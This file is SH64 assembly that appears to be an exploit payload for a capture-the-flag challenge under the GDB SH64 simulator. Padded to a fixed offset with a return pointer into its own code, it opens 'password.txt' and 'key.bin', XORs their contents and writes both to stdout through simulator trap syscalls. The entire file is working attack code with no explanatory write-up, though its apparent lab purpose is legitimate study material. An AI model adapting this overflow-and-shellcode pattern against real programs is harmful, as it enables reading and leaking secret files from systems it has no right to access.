/*
 * Use trap.
 * See gdb/sim/sh64/sh64.c:trap_handler()
 */

/* gdb-7.3.1/sim/sh64/sh64.c */
#define SYS_exit  1
#define SYS_read  3
#define SYS_write 4
#define SYS_open  5
#define SYS_close 6

	.org	0x2010 - 264 - 48

	.section .text

	.globl	_start
	.type	_start, @function
_start:
	.long	0x61626364
	.long	0
	.long	0
	.long	0

	.quad	_code

_code:
	movi	((_start >> 48) & 65535), r15
	shori	((_start >> 32) & 65535), r15
	shori	((_start >> 16) & 65535), r15
	shori	(_start & 65535), r15

	/*
	 * SYSCALL NO: R2
	 * ARG1-3: R3-R5
	 * RETVAL: R2
	 * ERRCODE: -
	 */

___r_open:
	movi	((_fname >> 48) & 65535), r3
	shori	((_fname >> 32) & 65535), r3
	shori	((_fname >> 16) & 65535), r3
	shori	((_fname - 1) & 65535), r3
	movi	0, r4
	movi	SYS_open, r2
	movi	34, r0
	trapa	r0

___r_read:
	add	r2, r63, r3
	movi	((_buffer >> 48) & 65535), r4
	shori	((_buffer >> 32) & 65535), r4
	shori	((_buffer >> 16) & 65535), r4
	shori	((_buffer - 1) & 65535), r4
	movi	16, r5
	movi	SYS_read, r2
	movi	34, r0
	trapa	r0

_save_size:
	add	r2, r63, r6

___r_kopen:
	movi	((_kname >> 48) & 65535), r3
	shori	((_kname >> 32) & 65535), r3
	shori	((_kname >> 16) & 65535), r3
	shori	((_kname - 1) & 65535), r3
	movi	0, r4
	movi	SYS_open, r2
	movi	34, r0
	trapa	r0

___r_kread:
	add	r2, r63, r3
	movi	((_kbuffer >> 48) & 65535), r4
	shori	((_kbuffer >> 32) & 65535), r4
	shori	((_kbuffer >> 16) & 65535), r4
	shori	((_kbuffer - 1) & 65535), r4
	add	r6, r63, r5
	movi	SYS_read, r2
	movi	34, r0
	trapa	r0

_exchange:
	movi	((_buffer >> 48) & 65535), r2
	shori	((_buffer >> 32) & 65535), r2
	shori	((_buffer >> 16) & 65535), r2
	shori	((_buffer - 1) & 65535), r2
	movi	((_kbuffer >> 48) & 65535), r3
	shori	((_kbuffer >> 32) & 65535), r3
	shori	((_kbuffer >> 16) & 65535), r3
	shori	((_kbuffer - 1) & 65535), r3
	add	r2, r6, r0
1:	ld.ub	r2, 0, r4
	ld.ub	r3, 0, r5
	xor	r4, r5, r4
	st.b	r2, 0, r4
	addi	r2, 1, r2
	addi	r3, 1, r3
	pta/l	1b, tr0
	bne/l	r2, r0, tr0

___r_write:
	movi	1, r3
	movi	((_buffer >> 48) & 65535), r4
	shori	((_buffer >> 32) & 65535), r4
	shori	((_buffer >> 16) & 65535), r4
	shori	((_buffer - 1) & 65535), r4
	add	r6, r63, r5
	movi	SYS_write, r2
	movi	34, r0
	trapa	r0

___r_kwrite:
	movi	1, r3
	movi	((_kbuffer >> 48) & 65535), r4
	shori	((_kbuffer >> 32) & 65535), r4
	shori	((_kbuffer >> 16) & 65535), r4
	shori	((_kbuffer - 1) & 65535), r4
	add	r6, r63, r5
	movi	SYS_write, r2
	movi	34, r0
	trapa	r0

___r_exit:
	movi	0, r3
	movi	SYS_exit, r2
	movi	34, r0
	trapa	r0

_fname:	.string	"password.txt"
_kname:	.string	"key.bin"

	.align 3
_code_end:

_buffer:
	.space	16
_kbuffer:
	.space	16
